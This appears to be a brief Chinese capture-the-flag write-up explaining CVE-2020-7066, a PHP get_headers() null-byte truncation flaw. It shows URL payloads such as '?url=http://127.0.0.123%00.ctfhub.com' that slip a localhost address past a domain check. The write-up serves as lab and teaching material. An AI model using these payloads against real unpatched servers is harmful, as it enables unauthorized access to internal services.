#PHP

hint : cve-2020-7066
cve-2020-7066: 在低于 7.2.29 的 PHP 版本 7.2.x，低于 7.3.16 的 7.3.x 和低于 7.4.4 的 7.4.x 中，将 get_headers（）与用户提供的 URL 一起使用时，如果 URL 包含零（\ 0）字符，则 URL 将被静默地截断。这可能会导致某些软件对 get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。

点击链接，返回包头有

```url
Hint: Flag in localhost
```

于是

```url
?url=http://127.0.0.1%00.ctfhub.com
```

返回有

```url
Tips: Host must be end with '123'
```

于是

```url
?url=http://127.0.0.123%00.ctfhub.com
```
